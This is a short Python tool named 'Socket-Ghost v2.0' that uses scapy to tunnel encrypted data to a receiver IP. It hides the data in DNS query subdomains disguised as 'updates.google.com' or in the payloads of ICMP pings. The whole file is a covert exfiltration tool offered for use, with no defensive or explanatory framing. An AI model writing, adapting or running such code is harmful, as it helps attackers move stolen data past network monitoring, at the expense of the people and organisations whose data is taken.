import sys
import random
import argparse
from scapy.all import IP, UDP, DNS, DNSQR, ICMP, send
from core.crypto import encrypt_payload

class SocketGhost:
    def __init__(self, target):
        self.target = target
        self.modes = ["DNS", "ICMP"]

    def dns_tunnel(self, encrypted_data):
        # Shred data into subdomains
        chunk = encrypted_data.decode().replace("=", "v")
        fake_domain = f"{chunk[:30]}.updates.google.com"
        pkt = IP(dst=self.target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=fake_domain))
        send(pkt, verbose=False)

    def icmp_tunnel(self, encrypted_data):
        # Hide data inside the 'Payload' field of a Ping
        pkt = IP(dst=self.target)/ICMP()/encrypted_data
        send(pkt, verbose=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Socket-Ghost v2.0")
    parser.add_argument("--target", required=True, help="Receiver IP")
    parser.add_argument("--data", required=True, help="Data to ghost")
    parser.add_argument("--mode", choices=["dns", "icmp"], default="dns")
    
    args = parser.parse_args()
    
    ghost = SocketGhost(args.target)
    secret = encrypt_payload(args.data)
    
    if args.mode == "dns":
        ghost.dns_tunnel(secret)
    else:
        ghost.icmp_tunnel(secret)
    print(f"💀 Ghost Signal Dispatched via {args.mode.upper()}.")
